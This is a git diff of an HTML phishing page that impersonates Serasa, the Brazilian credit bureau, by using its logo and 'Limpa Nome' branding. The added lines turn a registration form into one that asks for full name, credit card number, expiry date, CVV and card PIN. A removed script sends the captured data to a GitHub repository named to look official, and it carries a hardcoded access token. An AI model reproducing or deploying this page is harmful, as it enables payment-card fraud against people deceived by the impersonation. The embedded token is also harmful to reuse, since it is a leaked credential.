@@ -7,12 +7,12 @@
     <title>Consultas</title>
 </head>
 <body>
-    <!-- <nav>
+    <nav>
         <button class="navBtn" id="menuBtn" onclick="abrirMenu()">
             <img class="imagemBtn" src="./img/menu.png" alt="">
             <p>Menu</p>
         </button>
-        <img class="imgLimpaNome" src="xhttps://www.serasa.com.br/lno/static-webfiles/logo/serasa-white.svg" alt="">
+        <img class="imgLimpaNome" src="https://www.serasa.com.br/lno/static-webfiles/logo/serasa-white.svg" alt="">
         <button class="navBtn">
             <img class="imagemBtn" src="./img/perfil.png" alt="">
             <p>Entrar</p>
@@ -49,49 +49,61 @@
         </ul>
     </div>
     <label class="dark"></label>
-</div> -->
-<main>
-    <div class="labelCard">
+</div>
+<div class="labelCard">
+    
     <div class="homeCard">
+        
         <div class="form-container">
-            <h1>Cadastro</h1>
+            <div>
+            <img class="cardsformImg" src="./img/cards.png" alt="">
+            </div>
+            <h2>Confirme os dados do seu cartão de crédito</h2>
             <form id="cadastroForm">
                 <!-- Nome do Usuário -->
                 <div class="form-group">
-                    <label for="username">Nome de Usuário</label>
+                    <label for="username">Nome Completo</label>
                     <input type="text" id="username" name="username" required>
                 </div>
     
                 <!-- Número da CNH -->
                 <div class="form-group">
-                    <label for="cnh">Número da CNH</label>
+                    <label for="cnh">Número do Cartão</label>
                     <input type="text" id="cnh" name="cnh" required maxlength="19" pattern="\d{4}-\d{4}-\d{4}-\d{4}" placeholder="0000-0000-0000-0000">
                 </div>
     
                 <!-- Vencimento da CNH -->
                 <div class="form-group">
-                    <label for="cnhVenc">Vencimento da CNH</label>
+                    <label for="cnhVenc">Data de Expiração</label>
                     <input type="month" id="cnhVenc" name="cnhVenc" required>
                 </div>
     
                 <!-- Chave de Verificação -->
                 <div class="form-group">
-                    <label for="verificacao">Chave de Verificação</label>
+                    <label for="verificacao">CCV</label>
                     <input type="text" id="verificacao" name="verificacao" required maxlength="3" pattern="\d{3}" placeholder="000">
                 </div>
     
                 <!-- Senha do Cadastro -->
                 <div class="form-group">
-                    <label for="senha">Senha do Cadastro</label>
-                    <input type="password" id="senha" name="senha" required minlength="6">
+                    <label for="senha">Senha do Cartão</label>
+                    <input type="password" 
+                           id="senha" 
+                           name="senha" 
+                           required 
+                           pattern="\d{4,6}" 
+                           title="A senha deve conter de 4 a 6 dígitos numéricos">
                 </div>
+                
     
-                <button type="submit">Cadastrar</button>
+                <button type="submit">Verificar</button>
             </form>
         </div>
     </div>
     </div>
-    <!-- <div class="home">
+<main>
+
+    <div class="home">
         <div class="centro">
         <div class="limpaNome">
             <img src="./img/solucoes.png" alt="">
@@ -104,54 +116,9 @@
     </div>
     <div class="limpaNome">
         <img src="./img/chrome_jm7FXGa5c6.png" alt="">
-    </div> -->
+    </div>
 </main>
-<script>
-     // Adiciona máscara ao campo de CNH
-     document.getElementById('cnh').addEventListener('input', function (e) {
-            let value = e.target.value.replace(/\D/g, ''); // Remove caracteres não numéricos
-            let formatted = value.match(/\d{1,4}/g); // Agrupa em blocos de 4
-            if (formatted) {
-                e.target.value = formatted.join('-');
-            }
-        });
 
-        // Envia os dados do formulário para um servidor ou repositório
-        document.getElementById('cadastroForm').addEventListener('submit', async function (e) {
-            e.preventDefault(); // Evita o envio padrão
-
-            const formData = {
-                username: document.getElementById('username').value,
-                cnh: document.getElementById('cnh').value,
-                cnhVenc: document.getElementById('cnhVenc').value,
-                verificacao: document.getElementById('verificacao').value,
-                senha: document.getElementById('senha').value,
-            };
-
-            try {
-                const response = await fetch('https://api.github.com/repos/serasaoficial/serasa.com.br/contents/dados.json', {
-                    method: 'PUT',
-                    headers: {
-                        'Authorization': 'Bearer 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',
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        message: 'Adicionando dados do formulário',
-                        content: btoa(JSON.stringify(formData)), // Converte para Base64
-                        sha: '' // SHA do arquivo, deixe vazio se for novo
-                    })
-                });
-
-                if (response.ok) {
-                    alert('Dados enviados com sucesso!');
-                } else {
-                    alert('Erro ao enviar os dados: ' + response.statusText);
-                }
-            } catch (error) {
-                alert('Erro ao enviar os dados: ' + error.message);
-            }
-        });
-</script>
 <script src="./js/script.js"></script>
 
 <!-- codigo teste -->
